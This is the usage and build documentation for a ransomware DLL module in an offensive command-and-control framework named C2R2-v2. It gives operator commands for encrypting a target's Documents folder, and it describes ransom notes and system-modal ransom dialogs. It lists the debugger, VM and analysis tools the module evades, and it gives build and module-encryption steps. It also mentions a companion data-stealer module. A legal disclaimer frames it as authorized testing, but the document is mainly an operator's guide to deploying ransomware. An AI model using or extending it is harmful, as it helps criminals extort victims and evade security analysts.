# Ransomware Module

This document describes the ransomware module for C2R2-v2, implemented as a dynamically loadable DLL.

## ⚠️ LEGAL WARNING

**THIS MODULE IS FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**

Unauthorized use of ransomware is a **serious crime** punishable by:
- Criminal prosecution
- Imprisonment
- Substantial fines

Only use this module in controlled environments with explicit written authorization.

---

## Overview

The ransomware module (`ransomware-dll`) provides file encryption capabilities:

| Feature | Description |
|---------|-------------|
| Encryption | AES-256-CBC and ChaCha20-Poly1305 |
| Key Generation | Cryptographically secure 256-bit keys |
| Ransom Note | Automatic `RANSOM_NOTE.txt` creation |
| Decryption | Full recovery with correct key |
| GUI Dialogs | Windows message boxes for ransom display |
| Anti-Analysis | VM and debugger detection |

---

## Usage

### Encrypt Files

```bash
# Select target agent
C2R2> /select 1

# Encrypt a directory (max_depth = 5 levels)
C2R2 [1]> /encrypt C:\Users\Target\Documents 5
```

**Output:**
```
[*] Uploading ransomware module...
[*] Executing encryption...
[+] KEY:abc123def456789...:ENCRYPTED:42

# Save this key for decryption!
```

### Decrypt Files

```bash
# Use the key from encryption output
C2R2 [1]> /decrypt C:\Users\Target\Documents abc123def456789... 5
```

**Output:**
```
[+] OK:Decrypted 42 files
```

---

## File Handling

### Encrypted Files

- Original files get `.encrypted` extension
- Ransom note (`RANSOM_NOTE.txt`) created in each directory

### Files NOT Encrypted

The module avoids encrypting:
- Already encrypted files (`.encrypted`)
- System files (`.exe`, `.dll`, `.sys`, `.drv`, `.com`)
- Scripts (`.bat`, `.cmd`)
- Ransom notes (`RANSOM_NOTE.txt`)

---

## Features

### Encryption Algorithms

1. **AES-256-CBC** - Standard, compatible with previous versions
2. **ChaCha20-Poly1305** - Modern AEAD algorithm, faster on CPUs without AES-NI

### Anti-Analysis (Production Mode Only)

| Check | Method | Action |
|-------|--------|--------|
| Debugger | `IsDebuggerPresent()` | Skip encryption |
| Analysis Tools | Process enumeration | Skip if detected |
| Virtual Machine | Driver files, registry | Skip if detected |

**Detected Analysis Tools:**
- OllyDbg, x64dbg, IDA Pro
- Process Hacker, Process Monitor
- Wireshark, Fiddler
- Frida, Cheat Engine

### GUI Ransom Dialog

In production mode, displays Windows message boxes:
1. **Progress dialog** - "Encryption in progress..."
2. **Ransom dialog** - Shows key ID and ransom instructions

Uses `MB_SYSTEMMODAL | MB_TOPMOST` to keep dialogs visible.

---

## Key Management

### Automatic Storage

Encryption keys are automatically saved:

```
harvested/ransomware_key_<client_id>_<timestamp>.txt
```

**File Contents:**
```
Client: 1
Timestamp: 20241116_235959
Key: abc123def456789...
```

### Key Format

- 64 hexadecimal characters (32 bytes)
- Example: `a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2`

---

## Building the Module

```bash
# 1. Build the ransomware DLL
./build-ransomware.sh
# or
cargo build --release --target x86_64-pc-windows-gnu -p ransomware-dll

# 2. Encrypt the module
cd builder
cargo run --release -- encrypt-module --module ransomware

# Output:
# - c2r2-server/modules/ransomware.enc
# - c2r2-server/modules/ransomware.key
```

**Binary Size:** ~423KB

---

## Technical Details

### Exported Functions

```c
// Encrypt files in a directory
char* encrypt_directory(const char* path, uint32_t max_depth);

// Decrypt files with a key
char* decrypt_directory(const char* path, const char* key_hex, uint32_t max_depth);

// Free returned strings
void free_string(char* s);

// Get module version
char* get_version();
```

### Response Formats

**Encryption Success:**
```
KEY:abc123...:ENCRYPTED:42
```
- `KEY:` - Prefix
- `abc123...` - 64-char hex key
- `ENCRYPTED:` - Separator
- `42` - Number of files encrypted

**Decryption Success:**
```
OK:Decrypted 42 files
```

**Errors:**
```
ERROR:Directory does not exist
ERROR:No files to encrypt
ERROR:Invalid key format
```

---

## Module Architecture

```
ransomware-dll/
├── src/
│   ├── lib.rs           # DLL exports
│   ├── crypto.rs        # AES-256-CBC, ChaCha20-Poly1305
│   ├── fileops.rs       # File discovery and operations
│   ├── ransom_dialog.rs # Windows GUI dialogs
│   └── evasion.rs       # Anti-analysis
└── Cargo.toml
```

---

## Testing

### Safe Test Procedure

```powershell
# 1. Create test directory with sacrificial files
mkdir C:\test_ransomware
echo "test file 1" > C:\test_ransomware\file1.txt
echo "test file 2" > C:\test_ransomware\file2.txt
copy C:\Windows\System32\notepad.exe C:\test_ransomware\  # Won't be encrypted

# 2. From C2, encrypt
/select 1
/encrypt C:\test_ransomware 1

# 3. Verify encryption
dir C:\test_ransomware
# Should show: file1.txt.encrypted, file2.txt.encrypted, RANSOM_NOTE.txt, notepad.exe

# 4. Decrypt with the key from output
/decrypt C:\test_ransomware <key_from_encryption> 1

# 5. Verify recovery
type C:\test_ransomware\file1.txt
```

---

## OPSEC Considerations

### Detection Risk: **VERY HIGH**

Ransomware behavior is heavily monitored:
- File system activity patterns
- Mass file modifications
- `.encrypted` extensions
- Ransom note creation
- Windows dialogs from unknown processes

### Only Use When

- ✅ Authorized penetration test with ransomware scope
- ✅ Controlled lab environment
- ✅ No real user data at risk
- ✅ Recovery plan in place

### Never Use On

- ❌ Production systems without explicit authorization
- ❌ Systems with irreplaceable data
- ❌ Healthcare, financial, or critical infrastructure
- ❌ Personal computers of real users

---

## Limitations

1. **Windows Only** - Uses Windows-specific APIs
2. **Large Files** - May be slow on very large files
3. **Permissions** - Requires write access to target directories
4. **Not Memory-Only** - Temporarily writes decrypted module to disk

---

## Comparison with Stealer Module

| Aspect | Stealer | Ransomware |
|--------|---------|------------|
| Size | ~2MB | ~423KB |
| Purpose | Data theft | File encryption |
| Disk Impact | None | Modifies files |
| Reversible | N/A | Yes (with key) |
| Detection Risk | High | Very High |

---

## References

Implementation based on:
- [Rust-Ransomware](https://github.com/DarkFunct/Rust-Ransomware)
- [Rustomware](https://github.com/Idov31/rustomware)
- AES-GCM crate documentation

---

**⚠️ For authorized security testing purposes only. Unauthorized use of ransomware is a federal crime.**
